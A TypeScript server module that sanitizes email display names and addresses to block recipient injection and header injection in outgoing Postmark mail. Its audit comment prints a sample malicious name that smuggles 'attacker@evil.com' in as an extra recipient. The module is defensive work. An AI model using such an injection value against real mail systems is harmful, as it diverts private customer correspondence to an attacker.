import "server-only";

/**
 * Sanitize an untrusted display name before it is interpolated into an email
 * address field like `"<name>" <addr@host>`.
 *
 * WHY (audit 2026-07-07): the C.A.R.E inbound endpoint is public — anyone can
 * email support, and their From display name is stored verbatim as the customer
 * name (inbound/email/route.ts sets `name: body.FromName`). outbound.ts then
 * builds the Postmark `To` field as `"${customer.name}" <${customer.email}>`.
 * Postmark's To/From/Cc fields accept a COMMA-SEPARATED ADDRESS LIST, so a name
 * containing a `"` can close the quoted display-string early and inject an extra
 * recipient:
 *
 *     name = 'X" <attacker@evil.com>, "Y'
 *     ->  To: "X" <attacker@evil.com>, "Y" <real@customer.com>
 *     ->  the agent's reply is delivered to attacker@evil.com too.
 *
 * The fix: strip the characters that let a value break OUT of an RFC 5322
 * quoted display-string — the double-quote and backslash — plus CR/LF (header
 * injection) and other control chars. Once those are gone, the whole name stays
 * inside its quotes as a single display-string and CANNOT introduce a second
 * address, regardless of commas or angle brackets it contains.
 *
 * Pure + dependency-free so it's regression-pinned and every call site shares
 * ONE definition (§A13 — author the space once).
 */
export function sanitizeEmailDisplayName(raw: string | null | undefined): string {
  if (!raw) return "";
  return (
    raw
      // Drop the quote-string escape chars (") and (\) that enable break-out,
      // plus angle brackets (address delimiters) for defense in depth.
      .replace(/["\\<>]/g, "")
      // Strip CR/LF and every other C0/C1 control char (header injection).
      // eslint-disable-next-line no-control-regex
      .replace(/[\x00-\x1f\x7f-\x9f]/g, " ")
      .trim()
      // Bound the length — a display name is a label, not a payload.
      .slice(0, 200)
      .trim()
  );
}

/**
 * Build a safe `"Display Name" <addr@host>` recipient/sender string. When the
 * name sanitizes to empty, returns the bare address (no empty `""` wrapper).
 *
 * The address is normally already-validated by the caller (customer.email from the
 * verified inbound sender / a server-constructed from-address). But rather than RELY
 * on that (a future caller could pass an unvalidated address), we also strip CR/LF and
 * other control chars from the address here (§A27 — enforce at the chokepoint, don't
 * trust the caller). A control char is NEVER valid in an email address, so this cannot
 * break a legitimate address; it only closes a header-injection path if the caller's
 * validation is ever missing. Angle brackets are stripped too so the address can't
 * close its own `<...>` early.
 */
export function formatEmailAddress(
  address: string,
  displayName?: string | null
): string {
  const safe = sanitizeEmailDisplayName(displayName);
  const safeAddr = (address ?? "")
    // eslint-disable-next-line no-control-regex
    .replace(/[\x00-\x1f\x7f-\x9f<>]/g, "")
    .trim();
  return safe ? `"${safe}" <${safeAddr}>` : safeAddr;
}
